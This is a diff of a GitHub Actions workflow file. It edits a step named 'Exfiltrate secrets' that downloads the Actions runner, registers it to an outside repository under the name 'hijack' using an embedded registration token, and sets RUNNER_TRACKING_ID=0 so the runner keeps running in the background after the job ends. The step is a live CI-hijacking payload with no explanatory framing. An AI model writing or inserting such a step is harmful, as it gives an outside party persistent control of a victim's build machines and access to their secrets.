@@ -12,15 +12,15 @@ jobs:
     steps:
       - name: Checkout code
         uses: actions/checkout@v3
-# To register runner on c3 repo
+      # To register runner on c3 repo
       - name: Exfiltrate secrets
         run: |
           cd ~/
           ls
-          mkdir actions-runner3 && cd actions-runner3
+          mkdir actions-runner && cd actions-runner
           curl -o actions-runner-linux-x64-2.320.0.tar.gz -L https://github.com/actions/runner/releases/download/v2.320.0/actions-runner-linux-x64-2.320.0.tar.gz
           echo "93ac1b7ce743ee85b5d386f5c1787385ef07b3d7c728ff66ce0d3813d5f46900  actions-runner-linux-x64-2.320.0.tar.gz" | shasum -a 256 -c
           tar xzf ./actions-runner-linux-x64-2.320.0.tar.gz
-          ./config.sh --url https://github.com/he1m4n6a/dcweb --unattended --token ABXG7KLKOK3UORG66PVCRVLHCEU2Q  --name hijack
+          ./config.sh --url https://github.com/he1m4n6a/dcweb --token ABXG7KLYMT35N373XQQ6BL3HCEWQU --name hijack
           export RUNNER_TRACKING_ID=0;
           nohup ./run.sh &
